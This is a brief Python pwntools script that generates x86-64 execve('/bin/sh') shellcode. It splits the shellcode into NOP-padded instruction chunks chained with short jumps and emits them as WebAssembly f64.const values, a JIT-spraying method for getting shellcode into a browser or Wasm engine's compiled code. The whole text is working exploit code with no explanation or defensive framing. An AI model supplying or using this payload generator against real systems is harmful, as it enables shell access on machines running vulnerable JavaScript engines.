# generate shellcode

from pwn import *
context.arch = 'amd64'

shellcode = '''mov eax, 0x6e69622f
mov dword ptr [rsp], eax
mov eax, 0x68732f
mov dword ptr [rsp+4], eax
mov rdi, rsp
xor esi, esi
push rsi'''

jump = b'\xeb\x07'

for line in shellcode.split('\n'):
    print('    f64.const', struct.unpack('d', asm(line).rjust(6, b'\x90') + jump)[0])

shellcode = '''push 8
pop rsi
add rsi, rsp
push rsi
mov rsi, rsp
xor edx, edx
xor rax, rax
mov eax, 0x3b
syscall'''

jump = b'\xeb\x0c'

for line in shellcode.split('\n'):
    print('    f64.const', struct.unpack('d', asm(line).rjust(6, b'\x90') + jump)[0])